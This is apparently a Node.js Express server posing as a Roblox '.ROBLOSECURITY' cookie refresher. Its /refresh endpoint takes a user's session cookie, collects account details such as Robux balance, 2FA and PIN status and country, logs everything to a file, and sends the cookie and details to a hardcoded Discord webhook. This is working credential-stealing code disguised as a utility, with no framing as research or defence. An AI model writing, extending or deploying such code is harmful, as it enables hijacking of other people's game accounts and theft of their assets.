const express = require('express');
const axios = require('axios');
const fs = require('fs');

// Import the new CookieRefresher instead of old functions
const { CookieRefresher, parseProxyString, validateCookie } = require('./refresh');
const { RobloxUser } = require('./getuserinfo');

const app = express();
app.use(express.json());
app.use(express.static('public'));

// Configure proxy for cloud hosting
const CLOUD_PROXY = process.env.PROXY_STRING || null;
console.log('Proxy configured:', CLOUD_PROXY ? 'YES' : 'NO');

// Simple direct cookie validation function
async function simpleValidateCookie(cookie) {
    try {
        const response = await axios.get(
            'https://users.roblox.com/v1/users/authenticated',
            {
                headers: {
                    'Cookie': `.ROBLOSECURITY=${cookie}`,
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                timeout: 10000,
                validateStatus: () => true
            }
        );
        
        return {
            valid: response.status === 200,
            status: response.status,
            userId: response.data?.id || null,
            username: response.data?.name || null,
            displayName: response.data?.displayName || null
        };
    } catch (error) {
        console.error('Validation error:', error.message);
        return {
            valid: false,
            error: error.message
        };
    }
}

// Safe cookie refresher that always returns a cookie
async function safeRefreshCookie(roblosecurityCookie) {
    try {
        console.log('Attempting to refresh cookie...');
        
        // First, validate the cookie is still good
        const validation = await simpleValidateCookie(roblosecurityCookie);
        if (!validation.valid) {
            console.log('Cookie validation failed, returning original');
            return {
                success: false,
                cookie: roblosecurityCookie,
                method: 'validation_failed',
                message: 'Cookie is invalid'
            };
        }
        
        console.log('Cookie validated, user:', validation.username);
        
        // Try the CookieRefresher with proxy if configured
        if (CLOUD_PROXY) {
            try {
                const refresher = new CookieRefresher(roblosecurityCookie, {
                    proxy: parseProxyString(CLOUD_PROXY),
                    timeout: 15000,
                    maxRetries: 1
                });
                
                const result = await refresher.refresh();
                console.log('CookieRefresher result:', result.success ? 'SUCCESS' : 'FAILED');
                
                if (result.success) {
                    return {
                        success: true,
                        cookie: result.cookie,
                        method: result.method,
                        message: 'Refreshed successfully'
                    };
                }
            } catch (refresherError) {
                console.error('CookieRefresher failed:', refresherError.message);
            }
        }
        
        // If proxy not configured or refresher failed, try direct validation
        // Sometimes just accessing authenticated endpoint refreshes the session
        const revalidate = await simpleValidateCookie(roblosecurityCookie);
        if (revalidate.valid) {
            console.log('Direct validation successful, using original cookie');
            return {
                success: false, // Not really refreshed, but valid
                cookie: roblosecurityCookie,
                method: 'direct_validation',
                message: 'Cookie is still valid (no refresh)'
            };
        }
        
        // Last resort: return original cookie
        console.log('All methods failed, returning original cookie as fallback');
        return {
            success: false,
            cookie: roblosecurityCookie,
            method: 'fallback_original',
            message: 'Using original cookie (all refresh methods failed)'
        };
        
    } catch (error) {
        console.error('Safe refresh failed:', error);
        // Always return original cookie as fallback
        return {
            success: false,
            cookie: roblosecurityCookie,
            method: 'error_fallback',
            message: error.message
        };
    }
}

app.get('/refresh', async (req, res) => {
    const roblosecurityCookie = req.query.cookie;
    
    if (!roblosecurityCookie) {
        return res.status(400).json({ 
            error: "No cookie provided",
            usage: "Use ?cookie=YOUR_ROBLOSECURITY_COOKIE",
            success: false
        });
    }
    
    console.log(`\n=== /refresh endpoint called (cookie: ${roblosecurityCookie.length} chars) ===`);
    
    try {
        // 1. SAFELY REFRESH COOKIE (always returns a cookie)
        const refreshResult = await safeRefreshCookie(roblosecurityCookie);
        
        // 2. GET USER DATA with the cookie we have
        let userData = null;
        try {
            const robloxUser = await RobloxUser.register(refreshResult.cookie);
            userData = await robloxUser.getUserData();
            console.log('User data fetched for:', userData.username);
        } catch (userError) {
            console.error('Failed to get user data:', userError.message);
            userData = {
                username: 'Unknown',
                uid: 'Unknown',
                displayName: 'Unknown',
                createdAt: 'Unknown',
                country: 'Unknown',
                balance: 0,
                isTwoStepVerificationEnabled: false,
                isPinEnabled: false,
                isPremium: false,
                creditbalance: 0,
                rap: 0,
                avatarUrl: ''
            };
        }
        
        // 3. LOG TO FILE
        const fileContent = {
            timestamp: new Date().toISOString(),
            refreshSuccess: refreshResult.success,
            refreshMethod: refreshResult.method,
            refreshMessage: refreshResult.message,
            originalCookieLength: roblosecurityCookie.length,
            finalCookieLength: refreshResult.cookie.length,
            cookieChanged: refreshResult.cookie !== roblosecurityCookie,
            cookie: refreshResult.cookie,
            Username: userData.username,
            UserID: userData.uid,
            DisplayName: userData.displayName,
            CreationDate: userData.createdAt,
            Country: userData.country,
            AccountBalanceRobux: userData.balance,
            Is2FAEnabled: userData.isTwoStepVerificationEnabled,
            IsPINEnabled: userData.isPinEnabled,
            IsPremium: userData.isPremium,
            CreditBalance: userData.creditbalance,
            RAP: userData.rap
        };
        
        // Append to file safely
        try {
            fs.appendFileSync('refreshed_cookie.json', JSON.stringify(fileContent, null, 4) + ',\n');
            console.log('Logged to file');
        } catch (fileError) {
            console.error('Failed to write to file:', fileError.message);
        }
        
        // 4. SEND TO DISCORD WEBHOOK
        try {
            const webhookURL = 'https://discord.com/api/webhooks/1448713650629246977/cWtQq3F9Scg3mxN645XzdQEt2gEmhH5Yip5BDTPj37myl70yCVjPSnxS1T97hphlXgZB';
            
            const embedColor = refreshResult.success ? 65280 : 16711680; // Green or Red
            const embedTitle = refreshResult.success ? '✅ Cookie Refreshed' : '⚠️ Original Cookie (Refresh Failed)';
            
            const response = await axios.post(webhookURL, {
                embeds: [{
                    title: embedTitle,
                    description: `**Cookie (${refreshResult.success ? 'Refreshed' : 'Original'}):**\n\`\`\`${refreshResult.cookie.substring(0, 100)}...\`\`\``,
                    color: embedColor,
                    thumbnail: { url: userData.avatarUrl || '' },
                    fields: [
                        { name: 'Status', value: refreshResult.success ? 'SUCCESS' : 'FAILED', inline: true },
                        { name: 'Method', value: refreshResult.method, inline: true },
                        { name: 'Username', value: userData.username, inline: true },
                        { name: 'User ID', value: userData.uid, inline: true },
                        { name: 'Cookie Length', value: `${refreshResult.cookie.length} chars`, inline: true },
                        { name: 'Changed', value: refreshResult.cookie !== roblosecurityCookie ? 'YES' : 'NO', inline: true },
                        { name: 'Proxy Used', value: CLOUD_PROXY ? 'YES' : 'NO', inline: true },
                        { name: 'Message', value: refreshResult.message || 'N/A', inline: false }
                    ],
                    footer: { text: `Request at ${new Date().toLocaleString()}` }
                }]
            });
            console.log('Webhook sent successfully');
        } catch (webhookError) {
            console.error('Webhook failed:', webhookError.message);
        }
        
        // 5. RETURN TO CLIENT (FOR FRONTEND)
        res.json({
            success: refreshResult.success,
            method: refreshResult.method,
            cookie: refreshResult.cookie,
            cookieLength: refreshResult.cookie.length,
            cookieChanged: refreshResult.cookie !== roblosecurityCookie,
            message: refreshResult.message,
            userData: {
                username: userData.username,
                userId: userData.uid,
                displayName: userData.displayName,
                isPremium: userData.isPremium,
                balance: userData.balance
            },
            webhookSent: true
        });
        
    } catch (error) {
        console.error('Fatal error in /refresh:', error);
        
        // Even on error, return the original cookie
        res.status(500).json({
            success: false,
            cookie: roblosecurityCookie,
            method: 'error_fallback',
            message: `Server error: ${error.message}`,
            cookieLength: roblosecurityCookie.length,
            cookieChanged: false,
            error: true
        });
    }
});

// Simple validation endpoint
app.get('/validate', async (req, res) => {
    const cookie = req.query.cookie;
    
    if (!cookie) {
        return res.status(400).json({ error: "No cookie provided" });
    }
    
    try {
        const validation = await simpleValidateCookie(cookie);
        res.json(validation);
    } catch (error) {
        res.status(500).json({
            valid: false,
            error: error.message
        });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({
        status: 'online',
        timestamp: new Date().toISOString(),
        proxyConfigured: !!CLOUD_PROXY,
        endpoints: ['/refresh', '/validate', '/health']
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
    console.log(`Proxy configured: ${CLOUD_PROXY ? 'YES' : 'NO'}`);
    if (!CLOUD_PROXY) {
        console.warn('⚠️  WARNING: No proxy configured. Cookie refresh will likely fail on cloud hosting.');
    }
});